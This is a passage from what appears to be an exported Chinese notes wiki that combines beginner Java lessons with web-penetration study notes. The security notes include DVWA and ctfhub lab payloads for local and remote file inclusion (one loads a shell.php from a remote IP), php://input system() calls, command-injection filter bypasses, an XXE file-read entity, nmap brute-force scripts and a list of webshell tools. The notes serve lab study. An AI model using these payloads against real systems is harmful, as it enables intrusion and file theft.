System.out.println(\"地址：\\t\"+iKun.zhuZhi);\n```\n![[../../../../assets/Pasted image 20220629202044.png]]\n\n## 对实例化对象进行赋值\n```java\n    public static void main(String[] args) {\n\n        User 蔡徐坤=new User();\n\n        System.out.println(\"蔡徐坤进行赋值前：\");\n\n        System.out.println(\"id:\\t\\t\"+蔡徐坤.id);\n\n        System.out.println(\"name:\\t\\t\"+蔡徐坤.username);\n\n        System.out.println(\"address:\\t\"+蔡徐坤.addr);\n\n  \n\n        //对蔡徐坤实例变量进行赋值\n\n        //赋值User类中的属性\n\n        蔡徐坤.id=123;\n\n        蔡徐坤.username=\"蔡徐坤太美\";\n\n        //首先实例化一个Address对象\n\n        Address cxkAdd=new Address();\n\n        cxkAdd.city=\"上海市\";\n\n        cxkAdd.street=\"松江区北松公路\";\n\n        cxkAdd.zipcode=\"201600\";\n\n  \n\n        //将实例化cxkAdd的Address赋值给 蔡徐坤 对象的add属性\n\n        蔡徐坤.addr=cxkAdd;\n\n        //也可以采用 蔡徐坤.addr.city对实例化对象的属性进行赋值\n\n  \n\n        // 对其进行输出\n\n        System.out.println(\"蔡徐坤进行赋值前：\");\n\n        System.out.println(\"id:\\t\\t\"+蔡徐坤.id);\n\n        System.out.println(\"name:\\t\\t\"+蔡徐坤.username);\n\n        System.out.println(\"address:\\t\"+蔡徐坤.addr.city+蔡徐坤.addr.street+蔡徐坤.addr.zipcode);\n\n  \n\n    }\n```\n\t\n![[../../../../assets/Pasted image 20220629223003.png]]\n对象必须通过`引用.`去引用\n\n## 内存图绘画\n![[../assets/033244d0d44d4e7ba535aee4bc05f8c7.png]]\n\u003e 在对象进行赋值的时候，只是将对象的内存地址引用例如`“0x1234”`赋值给了新的实例变量，而不是将对象复制了给它\n```java\n        Address cxkAdd=new Address();\n\n        cxkAdd.city=\"上海市\";\n\n        cxkAdd.street=\"松江区北松公路\";\n\n        cxkAdd.zipcode=\"201600\";\n\n  \n\n        //将实例化cxkAdd的Address赋值给 蔡徐坤 对象的add属性\n\n        蔡徐坤.addr=cxkAdd;\n        System.out.println(蔡徐坤.addr);\n\n        System.out.println(cxkAdd);\n```\n\n![[../../../../assets/Pasted image 20220630100420.png]]\n打印对象地址函数`System.identityHashCode(类名.对象)`\n```java\n        System.out.println(System.identityHashCode(蔡徐坤.addr));\n\n        System.out.println(System.identityHashCode(cxkAdd));\n\n```\n输出结果\n```cmd\n292938459\n292938459\n```\n\n由上可知打印的是同一个引用地址","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/025_%E7%A9%BA%E6%8C%87%E9%92%88%E5%BC%82%E5%B8%B8":{"title":"025_空指针异常","content":"# 025_空指针异常\n\n\n## 基本\n\u003e “空引用”访问实例（对象相关）的数据，都会出现空指针异常。\n\u003e 当一个java对象没有任何的引用指向该对象时，垃圾回收期GC就会将该垃圾数据释放回收掉。\n\u003e 垃圾回收主要针对与**堆内存**的数据进行回收\n\n## 举例\n定义一个垃圾类，创建垃圾对象l1，对l1进行引用置空，出现空指针异常\n1. 创建类`Laji`\n\t```java\n\tpackage a001对象的创建;\n\tpublic class Laji {\n\t\tint id;\n\t\tString name;\n\t}\n\t```\n1. 创建垃圾对象`l1`\n\t```java\n\tpackage a001对象的创建;\n\tpublic class LajiTest {\n\t\tpublic static void main(String[] args) {\n\t\t\tLaji l1=new Laji();\n\t\t\tl1.id=001;\n\t\t\tl1.name=\"垃圾1\";\n\t\t\t//对垃圾l1所指向对象的属性进行输出\n\t\t\tSystem.out.println(l1.id+\"\\t\"+l1.name);\n\t\t\t//将l1的指向置空\n\t\t\tl1=null;\n\t\t\t//再进行输出属性\n\t\t\tSystem.out.println(l1.id+\"\\t\"+l1.name);\n\t\t}\n\t}\n\t```\n3. 输出结果为\n\t```CMD\n\t\t1       垃圾1\n\t\tException in thread \"main\" java.lang.NullPointerException\n        at a001对象的创建.LajiTest.main(LajiTest.java:13)\n\t```\n\t\n\u003e 由此可见出现了空指针异常的情况`java.lang.NullPointerException`，原因就是因为对l1所引用的对象内存地址置空了，对象l1所引用的对象没有了引用，就变成了类似于幽灵的状态，而l1页没有了具体的引用，所以就出现了空指针异常。需要进行**垃圾回收**，将之前l1所指向的对象进行回收.\n\u003e **当new的实例化对象引用被置空，那么访问这个被置空引用内的对象属性就会出现空指针异常**\n![[../assets/22c00353a0af43faa2518ed80b965050.png]]","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/026_%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92":{"title":"026_方法调用时的参数传递","content":"# 026_方法调用时的参数传递\n\n## 形式参数\n```java\n\tpublic class Cscd {\n    public static void main(String[] args) {\n        int i=10;\n        add(i);\n        System.out.println(\"i--\u003e\"+i);\n    }\n    public static void add(int i){\n        i++;\n        System.out.println(\"i--\u003e\"+i);\n    }\n}\n```\n输出结果\n```cmd\n\ti--\u003e11\n\ti--\u003e10\n```\n\n\u003e 将i传入到add方法中的形参i，通过i++之后输入11，但是在main方法中，再次进行输出i却还是10\n\u003e 原因是因为main方法中的i是实际参数，而add方法的i是形式参数，两个是重名的不同的两个引用，所以并没有改变main方法中的i值\n\u003e 如果需要改变i方法中的i，可以在main方法中进行赋值操作`i=add(i);`,同时将方法add()改为int返回值类型，最后在add方法中进行return返回增加之后的值\n```java\n\tpublic class Cscd {\n\n    public static void main(String[] args) {\n\n        int i=10;\n\n        i=add(i);\n\n        System.out.println(\"i--\u003e\"+i);\n\n    }\n\n    public static int add(int i){\n\n        i++;\n\n        System.out.println(\"i--\u003e\"+i);\n\n        return i;\n\n    }\n\n}\n```\n修改之后输出结果\n```cmd\n\ti--\u003e11\n\ti--\u003e11\n```","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-%E4%BB%80%E4%B9%88%E6%98%AFsession":{"title":"03-什么是session","content":"\n\n- 简单理解：**session相当于cookie的身份证，唯一标识了你的身份信息**\n- 因为cookie太多了，每次传输会比较占用速率，所以通过使用session来标识一个cookie，一般设置成一个id，每次认证，只需要通过传输session的id号来判断其对应的cookie，提交了访问速度。\n  \n  cookie和session的示意图：![](https://tc3.doingnothing.online/imgs/202303301645469.png) 区别： **cookie一般是存储在客户端，而session一般是存储在服务端** session并没有替代cookie，而是相当于使用session标识了一个cookie\n## ![](https://tc3.doingnothing.online/imgs/202303301710065.png)\n\n步骤：\n- 访问网站，网站收到访问，会产生一个session文件，保存在服务器上，session文件中存储的就是cookie内容；\n- 将cookie发送给客户端；\n- 客户端将cookie的值进行操作，比如记住密码，登录等等，并将cookie发送给服务器；\n- 服务器接收到cookie值，并在session的cookie内容中进行修改对应的值；\n- 后续登录，验证session，保持登录会话；\n- 销毁session，cookie过期。","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0SSRF%E6%BC%8F%E6%B4%9E":{"title":"03-如何发现SSRF漏洞","content":"\n\n- ## 实际案例\n- 1、爬取地址\n  2、查看是否请求了其他资源\n- 简述：在url查看是否有类似于`URL=XXX`的其他链接的请求\n-\n- 也可以用Google语法搜索关键字：inurl\n  share、wap、url、link、src、source、target、u、\n  3g、display、sourceURL、imageURL、domain\n- ## 发现工具\n- https://github.com/cujanovic/SSRF-Testing\n- https://github.com/tarunkant/Gopherus\n- https://github.com/swisskyrepo/SSRFmap\n-\n- [[../../../pages/靶场]]\n- http://localhost/pikachu/vul/ssrf/ssrf_curl.php\n- 这个就是 [[01-什么是SSRF漏洞]]中的那个代码片段\n-","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86":{"title":"03-端口服务信息收集","content":"\n\npublic:: true\n\n- #question 为什么收集端口号的信息？\n  \n  计算机上的服务，都通过端口进行监听，查看其服务的端口号是否在工作中，能够判断其开启的服务或者系统状态。比如myql默认的端口号是3306，查看3306的端口号信息就能判断是否运行mysql服务\n  \n  查看本机端口信息\n  \n  ```\n  Windows\n  netstat -aon|findstr 3306\n  Linux\n  netstat -an|grep 3306\n  ```\n  \n  远程机器端口\n  \n  ```\n  telnet 192.168.142.137 80\n  wget 192.168.142.137 80\n  nc -vz 192.168.142.137 445\n  ```\n  \n  ```\n  nc -v 192.168.1.1 80-900 #(可以批量扫描80-900之间的端口号)\n  ```\n  \n  ![](https://tc3.doingnothing.online/assets/image_1678625978742_0.png)\n  \n  其他： python代码扫描 wscan.py\n  \n  常见的端口：[https://nsrc.org/workshops/2009/summer/presentations/day3/common- ports.pdf](https://wiki.doingnothing.online/st%2004%20%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20551e45b595654e14bb1289079b130e99.md)\n## 常用的端口信息\n\n1、文件共享服务\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153309.png)\n\n2、远程连接服务\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153317.png)\n\n3、Web应用服务\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153328.png)\n\n4、数据库服务\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153336.png)\n\n5、邮件服务\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153345.png)\n\n6、网络常见协议\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153354.png)\n\n7、特殊服务端口\n\n![](https://tc3.doingnothing.online/assets/Pasted%20image%2020230314153404.png)\n## 端口扫描工具\n### Nmap（Network Mapper）\n\n[官网](https://nmap.org/)\n\n内置了大量的脚本，脚本数量：`ls /usr/share/nmap/scripts/ | wc -l` 常用的命令\n\n```\nnmap 192.168.142.137-script http-enum 列举HTTP服务\n\nnmap --script=auth 绕过鉴权\nnmap --script=brute 暴力破解\nnmap --script=vuln 扫描漏洞\n\n简单扫描\nnmap -sP 192.168.142.137\n指定端口或范围扫描：\nnmap -p0-65535 192.168.142.137\n探测操作系统：\nnmap -O 192.168.142.137\n只进行主机发现，不进行端口扫描\nnmap -sn 192.168.40.195/24\n```\n\neg使用 安装好metasploitable-linux-2.0.0靶机，配置好远程登录，使用kali的nmap来进行扫描 不带任何参数的扫描\n\n![](https://tc3.doingnothing.online/assets/image_1678629616424_0.png)\n### 其他工具\n\nNmap（Network Mapper）: [官网](https://nmap.org/)\n\nhttp://coolaf.com/tool/port\n\nmasscan、nbtscan……","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-%E7%BD%91%E7%AB%99%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7":{"title":"03-网站控制工具","content":"\n\n- 中国菜刀\n  中国蚁剑 https://github.com/[AntSwordProject](https://wiki.doingnothing.online/#AntSwordProject)/antSword\n  weevely https://github.com/epinna/weevely3\n  哥斯拉 godzilla https://github.com/[BeichenDream](https://wiki.doingnothing.online/#BeichenDream)/Godzilla\n  冰蝎 behinder https://github.com/rebeyond/Behinder","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-RCE%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1":{"title":"03-RCE漏洞的防御","content":"\n\n1. 使用的框架，升级到最新的版本，安装补丁等，避免旧版本的漏洞\n2. 尽量不要使用命令执行的函数\n3. 如果必须使用，需要做白名单处理\n4. 用正则表达式对用户输入的内容进行处理\n5. 使用WA","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-XXE-Lab":{"title":"03-XXE-Lab","content":"\n\n- 搭建\n\t- 使用phpstudy放进去就行了，操作过于简单\n-\n- ## 案例\n- 打开网站，输入用户名以及密码，进行登录，提示了用户名错误 ![image.png](../../assets/image_1681729644138_0.png)\n- 使用burp suite进行抓包，发现**发送的是xml封装的数据格式**\n- 对发送的xml数据中，**添加外部实体引入**，并在内容中进行使用，添加的外部引入例子如下（查看系统文件信息） ![image.png](../../assets/image_1681729825967_0.png)\n\t- ```\n\t  \u003c!DOCTYPE a[\n\t  \u003c!ENTITY xxe SYSTEM \"file:///c:/Windows/system.ini\"\u003e\n\t  ]\u003e\n\t  ```\n- 经过测试，左侧请求结果返回了文件信息`system.ini`的内容，说明**存在XXE漏洞**","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-csrf%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1":{"title":"03-csrf漏洞检测以及防御","content":"\n\n- 检测工具\n\t- 1. Burp Suite \n\t  2.  CSRF Tester \n\t  3.  [https://github.com/s0md3v/Bolt](https://github.com/s0md3v/Bolt) \n\t  4. 各种云产品\n- 防御\n\t- 使用referer字段：引用页; 引荐; 来源页面。作用：**跟踪来源，比如访问统计、广告效果**\n\t- 使用一些自定义的随机字段，使其无法伪造\n\t- 二次验证，比如短信等等，目前很多支付都有此类验证。\n\t-\n- tips\n\t- \u003e chrome和firefox的不同， **chrome的跨站请求会干掉request url字段中末尾所带的参数**\n\t  \n\t  例如，`https://www.baidu.com/?id=12`为请求地址，那么在chrome中就会去掉其参数，`request url`会变成`https://www.baidu.com`","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-ctfhub-%E8%BF%87%E6%BB%A4cat":{"title":"03-ctfhub-过滤cat","content":"\n\n- 和 [[02-ctfhub-命令注入]]一样，只不过不能用cat查看文件内容，使用less或者其他的查看就行了","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03-dvwa":{"title":"03-dvwa","content":"\n- ```\n  low\n  Structured Query Language\n  http://127.0.0.1//dvwa/vulnerabilities/fi/?page=file1.php\n  http://127.0.0.1//dvwa/vulnerabilities/fi/?page=file2.php\n  http://127.0.0.1//dvwa/vulnerabilities/fi/?page=file3.php\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../1.txt\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://远程IP/1.txt\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://远程\n  IP/alert.html\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://远程\n  IP/shell.php\n  medium\n  Structured Query Language\n  双写绕过：\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=hthttp://tp://远程\n  IP/alert.html\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..././..././1.txt\n  绝对路径：\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=E:\\dev_runApp\\phps\n  tudy_pro\\WWW\\dvwa\\1.txt\n  high\n  Structured Query Language\n  伪协议：\n  http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:\\Windows\\s\n  ystem.ini\n  ```","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/03.SQL%E6%B3%A8%E5%85%A5%E4%B9%8BMYSQL%E7%B3%BB%E7%BB%9F%E5%BA%93":{"title":"03.SQL注入之MYSQL系统库","content":"\n\n- ### 一.系统库释义\n  \n  提供了访问数据库元数据的方式\n  \n  元数据是关于数据库的数据，如数据库名和表名，列的数据类型或访问权限。\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921082000/df73281d42e04835b0f70ec0773ec8a8.png){:height 335, :width 734}\n  \n  1.**information_schema 库**：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；\n  \n  例如数据库或表的名称，列的数据类型或访问权限。有时用于此信息的其他术语是数据字典和系统目录。web渗透过程中用途很大。\n  \n  ```\n  SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， show databases结果取之此表。\n   ​\n     TABLES表：提供了关于数据中表的信息。table_name\n   ​\n     COLUMNS表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。column_name\n  ```\n  \n  ![image.png](https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/4348/1644921082000/f60d65e839dc412db97edf87fd572f47.png)\n  \n  2、**performance_schema库**具有87张表。\n  MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。\n  \n  3、**mysql库**是核心数据库，类似于sql server中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。\n  常用举例：在mysql.user表中修改root用户的密码\n  \n  4、**sys库**具有1个表，100个视图。\n  sys库是MySQL 5.7增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。\n  可以查询谁使用了最多的资源，哪张表访问最多等。","lastmodified":"2023-05-31T09:03:32.949906945Z","tags":null},"/031_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95":{"title":"031_构造方法","content":"# 031_构造方法\n\n## 概念\n构造方法的作用：\n\u003e 构造方法就是用来**构造对**象，并对**对象属性进行初始化赋值**的特殊方法\n1. 比较特殊的方法\n1. 构造方法是一个比较特殊的方法，通过**构造方法可以完成对象的创建，以及实例变量的初始化**\n1. 作用**相当于使用函数去创建对象，同时对实例化对象进行赋值**\n1. 方法就类似于函数，不要在其中添加class\n1. 构造方法可以有**多个**，当参数列表不同，**支持方法重载**\n\n\n## 格式\n构造方法语法格式：\n```java\n 修饰符列表 方法名(形式参数){\n \t方法体;\n }\n```\n**使用`new 方法名`进行调用**\n\n普通语法语法格式：\n```java\n修饰符列表 返回值类型 方法名(形式参数){\n\t方法体;\n}\n```\n直接使用方法名进行调用\n\n\n## eg\n构造方法\n```java\npackage a003构造方法;\n\n  \n\npublic class Student {\n\n    int id;\n\n    String name;\n\n    public Student(){ //必须使用和类名相同的方法名Student\n\n        System.out.println(\"我是一个无参数的构造方法\");\n\n    }\n\n}\n```\n\n普通方法，以及对两种方法的调用\n```java\npackage a003构造方法;\npublic class ConstructorTest {\n    public static void main(String[] args) {\n        System.out.println(\"普通方法\");\n        //普通方法，直接进行方法名调用\n        noneGz();\n        //构造方法，使用new进行调用\n        new Student();\n    }\n    public static void noneGz() {\n        System.out.println(\"我是一个无参数普通方法\");\n    }\n}\n```\n输出结果\n```cmd\n普通方法\n我是一个无参数普通方法\n我是一个无参数的构造方法\n```\n\n","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/032_%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9":{"title":"032_注意事项","content":"# 032_注意事项\n\n## 注意\n1. 修饰符列表目前统一使用public,**不要使用public static**\n2. **构造方法名与类名保持一致**\n3. 构造方法不需要指定返回值类型\n4. 当一个类中**手动的提供了有参数的构造方法**，那么**系统就不再提供无参数的构造方法**\n5.当一个类中没有提供任何构造方法，系统会提供一个默认的构造方法\t\n\t```java\n\t\t\tSystem.out.println(new Student());\n\t```\n\t输出显示\n\t```cmd\n\ta003构造方法.Student@7de26db8\n\t```\n\t没有定义student()构造方法，但是依旧会有默认的缺省构造器可以使用 ^2dca02\n6. 在编译的时候，如果构造方法的名称和类名不一致，那么编译器会认为其是普通方法，但是没有写返回值，会报错。\n\n\u003e [!todo]- 注意点\n\u003e[[#^2dca02|手动的提供构造方法]]之后，原来的无参数构造方法就**不存在**了，所以建议在建立类的时候，建议将[[033.构造方法举例#^wcgz001|无参数构造方法]]进行书写，避免编译和调用错误\n","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/033_%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E4%B8%BE%E4%BE%8B":{"title":"033_构造方法举例","content":"# 033_构造方法举例\n\n构造方法的作用\n\u003e 创建对象，同时将对象的属性进行赋值\n## 对无参数构造方法进行赋值\nuser类\n```java\n\tpublic class User {\n    int id;\n    String name;\n    int age;\n}\n```\nid,age的默认值是0，name的默认值是null，\n\u003e 这个默认值是在实例化对象创建之后才有的默认值，而不是本身就有默认值\n\u003e 也就是说需要`User u1=new User()`之后才有的默认值，必须要先new一个实例化对象，才有默认值。\n\n在进行书写构造方法的时候，**建议书写无参数构造方法**，避免出错\n无参数构造方法，同时可以对其进行默认值赋值，如下 ^wcgz001\n```java\n    public User(){\n\t\t//当你在无参数构造方法中进行赋值，那么就按照设置的默认值创建实例化对象\n\tid=1;\n\tname=\"test\";\n\tage=25;\n    }\n```\n在主方法中使用构造方法创建无参数的对象：\n```java\n        User u1=new User();\n\n        System.out.println(u1.id);\n\n        System.out.println(u1.name);\n\n        System.out.println(u1.age);\n```\n输出\n```cmd\n1\ntest\n25\n```\n\n## 构造方法调用实例\n建立四个不同参数的构造方法\n```java\npackage a003构造方法;\npublic class Vip {\n    long no;\n    String name;\n    String birth;\n    Boolean sex;\n    //无参数构造方法\n    public  Vip() {\n    }\n    //有参数构造方法\n\n    public Vip(long huiYuanHao,String xingMing){\n\n        no=huiYuanHao;\n\n        name=xingMing;\n\n    }\n\n  \n\n    //三个参数的构造方法\n\n    public Vip(long huiYuanHao,String xingMing,String shengRi){\n\n        no=huiYuanHao;\n\n        name=xingMing;\n\n        birth=shengRi;\n\n    }\n\n  \n\n    // 四个参数的构造方法\n\n    public Vip(long huiYuanHao,String xingMing,String shengRi,boolean xingBie){\n\n        no=huiYuanHao;\n\n        name=xingMing;\n\n        birth=shengRi;\n\n        sex=xingBie;\n\n    }\n\n}\n```\n在main方法中，调用不同的构造方法，并输出结果\n```java\npublic class VipTest {\n\n    public static void main(String[] args) {\n\n        //调用无参数的构造方法\n\n        Vip v1 = new Vip();\n\n        System.out.println(v1.no+\"\\t\"+v1.name+\"\\t\"+v1.birth+\"\\t\"+v1.sex);\n\n        //两个参数\n\n        Vip v2 = new Vip(1l,\"蔡徐坤\");\n\n        System.out.println(v2.no+\"\\t\"+v2.name+\"\\t\"+v2.birth+\"\\t\"+v2.sex);\n\n        //三个参数\n\n        Vip v3 = new Vip(002l,\"张家阿三\",\"不知道\");\n\n        System.out.println(v3.no+\"\\t\"+v3.name+\"\\t\"+v3.birth+\"\\t\"+v3.sex);\n\n        //四个参数\n\n        Vip v4 = new Vip(4l,\"阿四\",\"周四\",true);\n\n        System.out.println(v4.no+\"\\t\"+v4.name+\"\\t\"+v4.birth+\"\\t\"+v4.sex);\n\n    }\n\n}\n```\n输出结果\n![[../../../../assets/Pasted image 20220701162905.png]]","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/034_%E5%A4%AB%E5%A6%BB%E7%BB%93%E5%A9%9A":{"title":"034_夫妻结婚","content":"# 034_夫妻结婚\n\n```java\npackage day14作业;\n\npublic class Handw {\n    public static void main(String[] args) {\n        // 创建丈夫对象蔡徐坤\n        Husband cxk = new Husband(\"1234\",\"蔡徐坤\",\"1998年8月2日\",null);\n\n        // 创建妻子对象篮球\n        Wife basketball=new Wife(\"1235\",\"篮球\",\"1928年5月2日\",null);\n\n\n        //开始结婚\n        cxk.wife=basketball;\n        basketball.husband=cxk;\n        // 输出\n        System.out.println(basketball.name+\"的丈夫是\\t\"+basketball.husband.name);\n        System.out.println(cxk.name+\"的妻子是\\t\"+cxk.wife.name);\n    }\n}\nclass Husband{\n    String idCard;\n    String name;\n    String birth;\n    Wife wife;\n    //构造方法\n    public Husband(){\n\n    }\n    public Husband(String idCard,String name,String birth,Wife wife){\n        this.idCard=idCard;\n        this.name=name;\n        this.birth=birth;\n        this.wife=wife;\n    }\n}\nclass Wife{\n    String idCard;\n    String name;\n    String birth;\n    Husband husband;\n\n    //构造方法\n    public Wife(){\n\n    }\n    public Wife(String idCard, String name, String birth, Husband husband) {\n        this.idCard = idCard;\n        this.name = name;\n        this.birth = birth;\n        this.husband = husband;\n    }\n}\n\n```\n输出结果\n![[../../../../assets/Pasted image 20220703170404.png]]","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/04-CMS%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB":{"title":"04-CMS指纹识别","content":"\npublic:: true\n\n- [question](https://www.notion.so/question-be0e53e646ac4a04a334762b64f6d404) 什么是指纹识别？\n  \n  通过关键特征，识别出目标的CMS系统、服务 器、开发语言、操作系统、CDN、WAF的类别 版本等等\n  \n  识别的对象\n  \n  1、CMS信息：比如Discuz、织梦、帝国CMS、PHPCMS、ECshop等；\n  \n  2、前端技术：比如HTML5、jquery、bootstrap、Vue、ace等；\n  \n  3、开发语言：比如PHP、Java、Ruby、Python、C#等；\n  \n  4、Web服务器：比如Apache、 Nginx、IIS、lighttpd等；\n  \n  5、应用服务器：比如Tomcat、Jboss、Weblogic、Websphere等；\n  \n  6、操作系统信息：比如Linux、win2k8、win7、Kali、Centos等；\n  \n  7、CDN信息：是否使用CDN，如cloudflare、帝联、蓝讯、网宿、七牛云、阿里云等；\n  \n  8、WAF信息：是否使用WAF，如D盾、云锁、宝塔、安全狗、360等\n## CMS指纹识别\n\nCMS: 内容管理系统，主要是信息和内容为主的网站，比如社团，博客，医院，高校主页\n\n开源\n\n各类开源CMS - 企业建站系统：[MetInfo](https://wiki.doingnothing.online/#MetInfo)(米拓)、蝉知、[SiteServer](https://wiki.doingnothing.online/#SiteServer) CMS等;\n- B2C商城系统：商派Shopex、ECshop、[HiShop](https://wiki.doingnothing.online/#HiShop)、[XpShop](https://wiki.doingnothing.online/#XpShop)等;\n- 门户建站系统：[DedeCMS](https://wiki.doingnothing.online/#DedeCMS)(织梦)、帝国CMS、PHPCMS、动易[CmsTop](https://wiki.doingnothing.online/#CmsTop)等; - 博客系统：[WordPress](https://wiki.doingnothing.online/#WordPress)、Z-Blog等;\n- 论坛社区：Discuz、PHPwind、[WeCenter](https://wiki.doingnothing.online/#WeCenter)等; - 问答系统：Tipask、whatsns等;\n- 知识百科系统：HDwiki; - B2B门户系统：Destoon、B2Bbuilder、友邻B2B等;-\n- 人才招聘网站系统：骑士CMS、PHP云人才管理系统; - 房产网站系统：[FangCms](https://wiki.doingnothing.online/#FangCms)等;\n- 在线教育建站系统：Kesion、[EduSoho](https://wiki.doingnothing.online/#EduSoho); - 电影网站系统：苹果CMS、ctcms、movcms等;\n- 小说文学建站系统：杰奇CMS;\n  \n  [question](https://www.notion.so/question-be0e53e646ac4a04a334762b64f6d404) 识别思路\n- 版权信息栏目：比如by什么\n- 看网站样式与布局：有的开源有鲜明的布局或者样式特征\n- 查看网页源代码：\n- 可能会使用开源系统中官方的css引用的样式，图标等\n- 特定的目录结构：通过源代码查看是否有官方开源的特定目录，比如[WordPress](https://wiki.doingnothing.online/#WordPress)的`wp-content`目录结构\n- MD5值对比：使用的网页图标或者其他文件还是官方的，提取md5进行对比 1. md5值对比的开源项目：[cmsprint](https://github.com/Lucifer1993/cmsprint)\n- 通过特定文件进行分析`robots.txt`\n  \n  ![](https://tc3.doingnothing.online/assets/image_1678760303301_0.png)\n  \n  常用的开源cms系统识别的[工具](https://www.notion.so/47991310ff054b99afe69e9dacb27715) ：\n  \n  kaili自带 `whatweb -v www.discuz.net`\n  \n  浏览器插件：\n- Wappalyzer：https://www.wappalyzer.com\n- whatruns ：https://www.whatruns.com/\n  \n  在线的网站\n  \n  http://whatweb.bugscaner.com\n  \n  http://finger.tidesec.com/\n  \n  小工具：\n  \n  御剑指纹扫描器 Test404轻量CMS指纹识别v2.1\n  \n  开源项目：CMSeek","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/04-XXE%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95":{"title":"04-XXE防御方法","content":"\n\n- 微信官方的处理方式：https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5\n- 基本都是通过**禁用解析xml实体**的方式来防御XXE漏洞攻击\n- 也可以通过**waf或者关键字过滤**等等方式进行防御","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/04-ctfhub":{"title":"04-ctfhub","content":"\n\n- ![](https://tc3.doingnothing.online/imgs/202304112114244.png)\n- ```\n  https://www.ctfhub.com/\n  bugku-文件包含\n  Structured Query Language\n  http://challenge-06af585d6dd7039e.sandbox.ctfhub.com:10800/\n  http://challenge-\n  06af585d6dd7039e.sandbox.ctfhub.com:10800/?file=shell.txt\n  发起POST请求，参数：\n  ctfhub=system('ls');\n  ctfhub=system('cat /flag');\n  bugku-php://input\n  Structured Query Language\n  POST\n  ?file=php://input\n  \u003c?php system('ls /'); ?\u003e\n  \u003c?php system('cat /flag_16571'); ?\u003e\n  bugku-远程文件包含\n  Structured Query Language\n  POST\n  ?file=php://input\n  \u003c?php system('ls /'); ?\u003e\n  \u003c?php system('cat /flag'); ?\u003e\n  ```","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/04-ctfhub-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6":{"title":"04-ctfhub-过滤目录分隔符","content":"\n\n- ## [[思路]]\n- 使用cd切换到对应目录然后再操作 （命令之间使用;）\n- 或者%0a代替目录分隔符/\n- ## payload\n- 查看目录\n- ```\n  127.0.0.1;ls\n  ```\n- 查看flag文件名\n- ```\n  127.0.0.1\u0026cd flag_is_here;ls\n  ```\n- 使用base64查看flag文件\n- ```\n  127.0.0.1\u0026cd flag_is_here;cat flag_2224484983794.php|base64\n  ```","lastmodified":"2023-05-31T09:03:32.953906981Z","tags":null},"/04-ctfub-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC":{"title":"04-ctfub-过滤空格","content":"\n\n- 使用一些linux中可以替换空格的即可\n- 使用IFS$9、%09、\u003c、\u003e、\u003c\u003e、{,}、%20、${\n  IFS}、${IFS}来代替空格\n- ## payload\n- 查看目录\n\t- ```\n\t  127.0.0.1;ls\n\t  